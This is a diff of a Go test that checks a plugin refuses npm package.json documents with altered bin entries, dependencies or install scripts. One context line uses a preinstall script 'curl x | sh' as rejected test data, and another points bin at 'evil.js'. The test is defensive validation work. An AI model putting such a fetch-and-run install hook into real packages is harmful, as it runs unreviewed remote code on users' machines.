@@ -149,7 +149,11 @@ func TestBuildRefuses(t *testing.T) {
 		{"a peer dependency", "differ in peerDependencies", doc(func(d map[string]any) { d["peerDependencies"] = map[string]any{"x": "1"} })},
 		{"a bundled dependency", "differ in bundleDependencies", doc(func(d map[string]any) { d["bundledDependencies"] = []any{"lodash"} })},
 		{"another bin", "differ in bin", doc(func(d map[string]any) { d["bin"] = map[string]any{"widgets": "evil.js"} })},
-		{"bin as a string", "differ in bin", doc(func(d map[string]any) { d["bin"] = "cli.js" })},
+		{"bin as a string of another file", "differ in bin", doc(func(d map[string]any) { d["bin"] = "evil.js" })},
+		{"directories.bin in place of bin", "differ in bin", doc(func(d map[string]any) {
+			delete(d, "bin")
+			d["directories"] = map[string]any{"bin": "."}
+		})},
 		{"no postinstall", "differ in scripts.postinstall", doc(func(d map[string]any) { delete(d, "scripts") })},
 		{"a preinstall", "differ in scripts.preinstall", doc(func(d map[string]any) { d["scripts"].(map[string]any)["preinstall"] = "curl x | sh" })},
 		{"a document that is no object", "not a JSON object", upload(b, `["x"]`)},
@@ -168,6 +172,7 @@ func TestBuildRefuses(t *testing.T) {
 		"empty optionalDependencies":              func(d map[string]any) { d["optionalDependencies"] = map[string]any{} },
 		"bundleDependencies false":                func(d map[string]any) { d["bundleDependencies"] = false },
 		"another description":                     func(d map[string]any) { d["description"] = "other" },
+		"bin as a string of the same file":        func(d map[string]any) { d["bin"] = "./cli.js" },
 	} {
 		if _, err := (Plugin{}).Build(ctx, repo, doc(change)); err != nil {
 			t.Errorf("%s: %v", name, err)
